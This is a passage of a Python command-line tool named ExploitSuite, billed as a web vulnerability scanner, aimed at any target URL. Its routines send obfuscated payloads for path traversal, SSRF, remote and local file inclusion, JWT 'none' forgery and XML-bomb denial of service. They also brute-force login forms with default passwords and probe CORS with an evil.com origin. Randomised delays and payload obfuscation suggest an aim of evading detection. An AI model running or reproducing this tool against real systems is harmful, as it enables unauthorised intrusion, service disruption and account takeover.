                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_path_traversal_response(response):
                        vuln = {
                            "type": "Path Traversal",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Path Traversal found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_path_traversal_response(self, response):
        content = response.text.lower()
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
        
        # Check for Windows file content
        if "for 16-bit app support" in content or "[fonts]" in content or "[extensions]" in content:
            return True
            
        return False
    
    def _scan_ssrf(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for SSRF vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["ssrf"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_ssrf_response(response):
                        vuln = {
                            "type": "SSRF",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SSRF found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["ssrf"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_ssrf_response(response):
                        vuln = {
                            "type": "SSRF",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SSRF found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_ssrf_response(self, response):
        content = response.text.lower()
        
        # Check for AWS metadata
        if "ami-id" in content or "instance-id" in content or "hostname" in content:
            return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def _scan_rfi(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for RFI vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["rfi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_rfi_response(response):
                        vuln = {
                            "type": "RFI",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] RFI found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["rfi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_rfi_response(response):
                        vuln = {
                            "type": "RFI",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] RFI found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_rfi_response(self, response):
        content = response.text.lower()
        
        # Check for common shell indicators
        if "shell_exec" in content or "passthru" in content or "system(" in content or "exec(" in content:
            return True
            
        return False
    
    def _scan_lfi(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for LFI vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["lfi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_lfi_response(response):
                        vuln = {
                            "type": "LFI",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] LFI found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["lfi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_lfi_response(response):
                        vuln = {
                            "type": "LFI",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] LFI found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_lfi_response(self, response):
        content = response.text.lower()
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
        
        # Check for Windows file content
        if "for 16-bit app support" in content or "[fonts]" in content or "[extensions]" in content:
            return True
            
        return False
    
    def _scan_jwt_none(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for JWT None Algorithm vulnerabilities on {url}")
        
        # Check for JWT in cookies
        if "Cookie" in self.session.headers:
            cookies = self.session.headers["Cookie"].split(";")
            for cookie in cookies:
                cookie = cookie.strip()
                if "=" in cookie:
                    name, value = cookie.split("=", 1)
                    if self._is_jwt(value):
                        for payload in self.payloads["jwt_none"]:
                            modified_jwt = value.split(".")[0] + "." + payload
                            self.session.headers["Cookie"] = f"{name}={modified_jwt}"
                            response = self.session.get(url, verify=False, timeout=10)
                            
                            if self._check_jwt_none_response(response):
                                vuln = {
                                    "type": "JWT None Algorithm",
                                    "url": url,
                                    "parameter": "Cookie",
                                    "payload": modified_jwt,
                                    "evidence": self._get_evidence(response)
                                }
                                self.results["vulnerabilities"].append(vuln)
                                print(f"{Fore.GREEN}[!] JWT None Algorithm found in {name} cookie")
                                break
                            
                            self._random_delay()
        
        # Check for JWT in Authorization header
        if "Authorization" in self.session.headers:
            auth_header = self.session.headers["Authorization"]
            if auth_header.startswith("Bearer "):
                jwt_token = auth_header[7:]
                if self._is_jwt(jwt_token):
                    for payload in self.payloads["jwt_none"]:
                        modified_jwt = jwt_token.split(".")[0] + "." + payload
                        self.session.headers["Authorization"] = f"Bearer {modified_jwt}"
                        response = self.session.get(url, verify=False, timeout=10)
                        
                        if self._check_jwt_none_response(response):
                            vuln = {
                                "type": "JWT None Algorithm",
                                "url": url,
                                "parameter": "Authorization",
                                "payload": modified_jwt,
                                "evidence": self._get_evidence(response)
                            }
                            self.results["vulnerabilities"].append(vuln)
                            print(f"{Fore.GREEN}[!] JWT None Algorithm found in Authorization header")
                            break
                        
                        self._random_delay()
    
    def _is_jwt(self, token):
        parts = token.split(".")
        if len(parts) != 3:
            return False
        
        try:
            # Try to decode header and payload
            header = base64.urlsafe_b64decode(parts[0] + "=" * (4 - len(parts[0]) % 4))
            payload = base64.urlsafe_b64decode(parts[1] + "=" * (4 - len(parts[1]) % 4))
            return True
        except:
            return False
    
    def _check_jwt_none_response(self, response):
        content = response.text.lower()
        
        # Check for successful authentication
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def _scan_xml_bomb(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for XML Bomb vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["xml_bomb"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    start_time = time.time()
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    end_time = time.time()
                    
                    if end_time - start_time > 10:  # Check for DoS
                        vuln = {
                            "type": "XML Bomb",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": f"Time delay: {end_time - start_time} seconds"
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XML Bomb found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _scan_weak_credentials(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Weak Credentials on {url}")
        
        login_forms = []
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            has_password = False
            has_username = False
            
            for input in form_details["inputs"]:
                if input["type"] == "password":
                    has_password = True
                if input["name"] in ["username", "user", "login", "email"]:
                    has_username = True
            
            if has_password and has_username:
                login_forms.append(form_details)
        
        for form in login_forms:
            username_field = None
            password_field = None
            
            for input in form["inputs"]:
                if input["type"] == "password":
                    password_field = input["name"]
                if input["name"] in ["username", "user", "login", "email"]:
                    username_field = input["name"]
            
            for username, password in self.default_credentials:
                data = {}
                for input in form["inputs"]:
                    if input["name"] == username_field:
                        data[input["name"]] = username
                    elif input["name"] == password_field:
                        data[input["name"]] = password
                    else:
                        data[input["name"]] = input["value"]
                
                if form["method"] == "post":
                    response = self.session.post(form["action"], data=data, verify=False, timeout=10)
                else:
                    response = self.session.get(form["action"], params=data, verify=False, timeout=10)
                
                if self._check_login_response(response):
                    vuln = {
                        "type": "Weak Credentials",
                        "url": url,
                        "method": form["method"],
                        "username": username,
                        "password": password,
                        "evidence": self._get_evidence(response)
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] Weak Credentials found: {username}:{password}")
                    break
                
                self._random_delay()
    
    def _check_login_response(self, response):
        content = response.text.lower()
        
        # Check for successful login indicators
        if "welcome" in content.lower() or "dashboard" in content.lower() or "logout" in content.lower() or "profile" in content.lower():
            return True
        
        # Check for redirect after login
        if response.status_code == 302 and "location" in response.headers:
            return True
            
        return False
    
    def _scan_brute_force(self, url, username_list=None, password_list=None):
        print(f"{Fore.YELLOW}[+] Scanning for Brute Force vulnerabilities on {url}")
        
        if not username_list:
            username_list = ["admin", "administrator", "root", "user", "test"]
        
        if not password_list:
            password_list = ["admin", "password", "123456", "root", "toor", "test", "guest"]
        
        login_forms = []
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            has_password = False
            has_username = False
            
            for input in form_details["inputs"]:
                if input["type"] == "password":
                    has_password = True
                if input["name"] in ["username", "user", "login", "email"]:
                    has_username = True
            
            if has_password and has_username:
                login_forms.append(form_details)
        
        for form in login_forms:
            username_field = None
            password_field = None
            
            for input in form["inputs"]:
                if input["type"] == "password":
                    password_field = input["name"]
                if input["name"] in ["username", "user", "login", "email"]:
                    username_field = input["name"]
            
            for username in username_list:
                for password in password_list:
                    data = {}
                    for input in form["inputs"]:
                        if input["name"] == username_field:
                            data[input["name"]] = username
                        elif input["name"] == password_field:
                            data[input["name"]] = password
                        else:
                            data[input["name"]] = input["value"]
                    
                    if form["method"] == "post":
                        response = self.session.post(form["action"], data=data, verify=False, timeout=10)
                    else:
                        response = self.session.get(form["action"], params=data, verify=False, timeout=10)
                    
                    if self._check_login_response(response):
                        vuln = {
                            "type": "Brute Force",
                            "url": url,
                            "method": form["method"],
                            "username": username,
                            "password": password,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Brute Force successful: {username}:{password}")
                        return
                    
                    self._random_delay()
    
    def _scan_security_headers(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Security Headers on {url}")
        
        try:
            response = self.session.get(url, verify=False, timeout=10)
            
            for header, message in self.security_headers.items():
                if header not in response.headers:
                    vuln = {
                        "type": "Missing Security Header",
                        "url": url,
                        "header": header,
                        "evidence": message
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] Missing Security Header: {header}")
        except Exception as e:
            print(f"{Fore.RED}Error checking security headers: {str(e)}")
    
    def _scan_open_redirect(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Open Redirect vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                # Test with common redirect parameters
                if input["name"] in ["url", "redirect", "return", "return_to", "next", "target"]:
                    payload = "https://google.com"
                    response = self._submit_form(form_details, url, payload, input["name"])
                    
                    if self._check_open_redirect_response(response):
                        vuln = {
                            "type": "Open Redirect",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Open Redirect found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                if param in ["url", "redirect", "return", "return_to", "next", "target"]:
                    payload = "https://google.com"
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_open_redirect_response(response):
                        vuln = {
                            "type": "Open Redirect",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Open Redirect found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_open_redirect_response(self, response):
        # Check for redirect to external site
        if response.status_code in [301, 302, 303, 307, 308] and "location" in response.headers:
            location = response.headers["location"]
            if location.startswith("http") and not location.startswith(self.target_url):
                return True
                
        return False
    
    def _scan_cors_misconfiguration(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for CORS Misconfiguration on {url}")
        
        try:
            # Test with origin header
            origin = "https://evil.com"
            headers = {"Origin": origin}
            response = self.session.get(url, headers=headers, verify=False, timeout=10)
            
            if "Access-Control-Allow-Origin" in response.headers:
                allowed_origin = response.headers["Access-Control-Allow-Origin"]
                
                # Check if any origin is allowed
                if allowed_origin == "*":
                    vuln = {
                        "type": "CORS Misconfiguration",
                        "url": url,
                        "header": "Access-Control-Allow-Origin: *",
                        "evidence": "Any origin is allowed"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] CORS Misconfiguration: Any origin is allowed")
                
                # Check if our evil origin is allowed
                elif allowed_origin == origin:
                    vuln = {
                        "type": "CORS Misconfiguration",
                        "url": url,
                        "header": f"Access-Control-Allow-Origin: {allowed_origin}",
                        "evidence": f"External origin {origin} is allowed"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] CORS Misconfiguration: External origin {origin} is allowed")
                
                # Check if credentials are allowed with any origin
                if "Access-Control-Allow-Credentials" in response.headers and response.headers["Access-Control-Allow-Credentials"] == "true" and allowed_origin == "*":
                    vuln = {
                        "type": "CORS Misconfiguration",
                        "url": url,
                        "header": "Access-Control-Allow-Credentials: true with Access-Control-Allow-Origin: *",
                        "evidence": "Credentials are allowed with any origin"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] CORS Misconfiguration: Credentials are allowed with any origin")
        except Exception as e:
            print(f"{Fore.RED}Error checking CORS: {str(e)}")
    
    def _scan_http_methods(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for HTTP Methods on {url}")
        
        try:
            # Test OPTIONS method
            response = self.session.options(url, verify=False, timeout=10)
            
            if "Allow" in response.headers:
                allowed_methods = response.headers["Allow"].split(", ")
                
                # Check for dangerous methods
                dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
                for method in dangerous_methods:
                    if method in allowed_methods:
                        vuln = {
                            "type": "Dangerous HTTP Method",
                            "url": url,
                            "method": method,
                            "evidence": f"Method {method} is allowed"
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Dangerous HTTP Method: {method} is allowed")
        except Exception as e:
            print(f"{Fore.RED}Error checking HTTP methods: {str(e)}")
    
    def _scan_backup_files(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Backup Files on {url}")
        
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        for file in self.backup_files:
            test_url = f"{base_url}/{file}"
            try:
                response = self.session.get(test_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    vuln = {
                        "type": "Backup File",
                        "url": test_url,
                        "evidence": f"File {file} is accessible"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] Backup File found: {test_url}")
                
                self._random_delay()
            except Exception as e:
                print(f"{Fore.RED}Error checking backup file {file}: {str(e)}")
    
    def _scan_common_dirs(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Common Directories on {url}")
        
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        for directory in self.common_dirs:
            test_url = f"{base_url}/{directory}"
            try:
                response = self.session.get(test_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    vuln = {
                        "type": "Open Directory",
                        "url": test_url,
                        "evidence": f"Directory {directory} is accessible"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] Open Directory found: {test_url}")
                
                self._random_delay()
            except Exception as e:
                print(f"{Fore.RED}Error checking directory {directory}: {str(e)}")
    
    def _scan_idor(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for IDOR vulnerabilities on {url}")
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                if param in ["id", "user_id", "account_id", "uid"]:
                    original_value = params[param][0]
                    
                    # Try to increment the ID
                    try:
                        incremented_value = str(int(original_value) + 1)
                        test_params = params.copy()
                        test_params[param] = incremented_value
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, verify=False, timeout=10)
                        
                        if response.status_code == 200 and len(response.text) > 100:
                            vuln = {
                                "type": "IDOR",
                                "url": url,
                                "method": "GET",
                                "parameter": param,
                                "payload": incremented_value,
                                "evidence": f"Accessed resource with ID {incremented_value}"
                            }
                            self.results["vulnerabilities"].append(vuln)
                            print(f"{Fore.GREEN}[!] IDOR found: {param} parameter in {url}")
                    except:
                        pass
                    
                    self._random_delay()
    
    def _scan_csrf(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for CSRF vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            # Check if form is sensitive (has password field or action suggests state change)
            is_sensitive = False
            for input in form_details["inputs"]:
                if input["type"] == "password":
                    is_sensitive = True
                    break
            
            if not is_sensitive:
                action = form_details["action"].lower()
                if any(keyword in action for keyword in ["delete", "update", "change", "edit", "add", "create", "remove"]):
                    is_sensitive = True
            
            if is_sensitive:
                # Check for CSRF token
                has_csrf_token = False
                for input in form_details["inputs"]:
                    if input["name"] in ["csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token"]:
                        has_csrf_token = True
                        break
                
                if not has_csrf_token:
                    vuln = {
                        "type": "CSRF",
                        "url": url,
                        "method": form_details["method"],
                        "evidence": "Sensitive form without CSRF token"
                    }
                    self.results["vulnerabilities"].append(vuln)
                    print(f"{Fore.GREEN}[!] CSRF found: Sensitive form without CSRF token in {url}")
    
    def _get_evidence(self, response):
        # Extract relevant evidence from the response
        evidence = ""
        
        # Check for error messages
        errors = [
            "you have an error in your sql syntax",
            "warning: mysql_fetch_assoc()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql query failed",
            "syntax error",
            "unexpected end of sql command",
            "microsoft ole db provider for odbc drivers error",
            "ora-00936: missing expression",
            "microsoft jet database engine error",
            "syntaxerror",
            "unexpected token",
            "bson",
            "mongodb",
            "error parsing",
            "invalid object",
            "casterror",
            "sh: command not found",
            "bash: command not found",
            "cmd.exe not found",
            "command failed",
            "syntax error",
            "ldap_search()",
            "ldap_bind()",
            "ldap_connect()",
            "invalid dn syntax",
            "operations error",
            "protocol error",
            "timelimit exceeded",
            "sizelimit exceeded",
            "strongauth required",
            " referral",
            "xml parsing error",
            "xml declaration allowed only at the start of the document",
            "failed to parse external entity",
            "external entity processing is disabled",
            "entity resolution not possible",
            "xpath error",
            "xpath parsing error",
            "xpath query failed",
            "invalid xpath expression",
            "xpath syntax error",
            "[an error occurred while processing this directive]",
            "ssi error",
            "invalid ssi directive"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                evidence = error
                break
        
        return evidence
    
    def run_all_scans(self):
        print(f"{Fore.CYAN}[*] Starting comprehensive security scan on {self.target_url}")
        
        # Run all scans
        self._scan_sql_injection(self.target_url)
        self._scan_blind_sql_injection(self.target_url)
        self._scan_nosql_injection(self.target_url)
        self._scan_command_injection(self.target_url)
        self._scan_ldap_injection(self.target_url)
        self._scan_xxe_injection(self.target_url)
        self._scan_xpath_injection(self.target_url)
        self._scan_ssi_injection(self.target_url)
        self._scan_xss(self.target_url)
        self._scan_path_traversal(self.target_url)
        self._scan_ssrf(self.target_url)
        self._scan_rfi(self.target_url)
        self._scan_lfi(self.target_url)
        self._scan_jwt_none(self.target_url)
        self._scan_xml_bomb(self.target_url)
        self._scan_weak_credentials(self.target_url)
        self._scan_brute_force(self.target_url)
        self._scan_security_headers(self.target_url)
        self._scan_open_redirect(self.target_url)
        self._scan_cors_misconfiguration(self.target_url)
        self._scan_http_methods(self.target_url)
        self._scan_backup_files(self.target_url)
        self._scan_common_dirs(self.target_url)
        self._scan_idor(self.target_url)
        self._scan_csrf(self.target_url)
        
        # Save results
        if self.output_file:
            with open(self.output_file, "w") as f:
                json.dump(self.results, f, indent=4)
            print(f"{Fore.CYAN}[*] Results saved to {self.output_file}")
        
        print(f"{Fore.CYAN}[*] Scan completed. Found {len(self.results['vulnerabilities'])} vulnerabilities.")
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description="Advanced Web Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests (default: 0.5)")
    parser.add_argument("--user-agent", help="Custom User-Agent")
    parser.add_argument("--cookie", help="Custom Cookie")
    parser.add_argument("--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    
    args = parser.parse_args()
    
    scanner = ExploitSuite(
        target_url=args.url,
        output_file=args.output,
        delay=args.delay,
        user_agent=args.user_agent,
        cookie=args.cookie,
        proxy=args.proxy
    )
    
    scanner.run_all_scans()

if __name__ == "__main__":
    main()
